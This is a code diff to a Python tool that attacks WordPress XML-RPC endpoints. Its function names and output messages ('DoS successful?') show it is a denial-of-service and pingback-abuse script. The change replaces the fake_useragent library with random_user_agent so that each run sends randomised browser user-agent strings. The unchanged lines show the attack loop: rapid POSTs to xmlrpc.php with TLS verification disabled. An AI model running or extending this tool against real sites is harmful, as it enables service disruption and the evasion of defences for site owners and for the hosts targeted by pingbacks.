@@ -1,7 +1,8 @@
 import sys
 import requests
 import urllib3
-from fake_useragent import UserAgent
+from random_user_agent.user_agent import UserAgent
+from random_user_agent.params import SoftwareName, OperatingSystem
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -93,7 +94,7 @@ def single_target_attack(pingback, target, entries, user_agent, requests_nummber
         while requests_nummber:
             try:
                 r = requests.post(
-                    f"{target}/xmlrpc.php", data, headers={"user-agent": user_agent.random}, verify=False, allow_redirects=False, timeout=.2)
+                    f"{target}/xmlrpc.php", data, headers={"user-agent": user_agent}, verify=False, allow_redirects=False, timeout=.2)
                 if r.status_code != 200:
                     print(
                         f"\n{colors.RED}[!] Received odd status ({r.status_code}) -- DoS successful?{colors.CLEAR}\n")
@@ -123,7 +124,7 @@ def check_xmlrpc(target, user_agent):
     print(
         f"[>] Checking if XML-RPC for {colors.PURPLE}{target}{colors.CLEAR} is enabled ...")
     try:
-        r = requests.get(f"{target}/xmlrpc.php", headers={"user-agent": user_agent.random},
+        r = requests.get(f"{target}/xmlrpc.php", headers={"user-agent": user_agent},
                          verify=False, allow_redirects=False, timeout=5)
         if r.text == "XML-RPC server accepts POST requests only.":
             print(f"{colors.GREEN}[>] XML-RPC enabled.{colors.CLEAR}\n")
@@ -138,10 +139,22 @@ def check_xmlrpc(target, user_agent):
     print(f"----------------------------------------------------------------------------")
 
 
+def get_random_user_agent():
+    software_names = [SoftwareName.CHROME.value,
+                      SoftwareName.FIREFOX.value, SoftwareName.EDGE.value]
+    operating_systems = [OperatingSystem.WINDOWS.value,
+                         OperatingSystem.LINUX.value]
+    user_agent_rotator = UserAgent(
+        software_names=software_names, operating_systems=operating_systems, limit=100)
+    user_agent = user_agent_rotator.get_random_user_agent()
+
+    return user_agent
+
+
 def main():
     banner()
     action, pingback, target, entries, multiple_targets, requests_nummber = get_args()
-    user_agent = UserAgent()
+    user_agent = get_random_user_agent()
 
     print(
         f"----------------------------------------------------------------------------")
